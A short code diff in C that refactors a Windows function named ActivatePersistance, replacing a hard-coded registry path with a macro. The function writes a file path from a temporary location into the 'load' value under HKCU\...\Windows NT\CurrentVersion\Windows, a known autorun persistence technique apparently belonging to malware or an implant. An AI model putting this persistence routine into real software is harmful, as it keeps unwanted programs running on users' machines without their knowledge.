@@ -23,7 +23,7 @@ BOOL ActivatePersistance()
 	/* ---------------------------------------------------------------------------------------------------------------------------------------- */
 
 	result = RegOpenKeyW(
-		HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\", &hKey );
+		HKEY_CURRENT_USER, REGISTRY_SUBKEY, &hKey );
 	if ( result != ERROR_SUCCESS )
 	{
 		REG_ERR( "RegOpenKeyW", result );
@@ -31,7 +31,7 @@ BOOL ActivatePersistance()
 		return -1;
 	}
 
-	result = RegSetKeyValueW( HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\", L"load",
+	result = RegSetKeyValueW( HKEY_CURRENT_USER, REGISTRY_SUBKEY, L"load",
 	                          REG_SZ, tempPath, MAX_PATH + 1 );
 	if ( result != ERROR_SUCCESS )
 	{
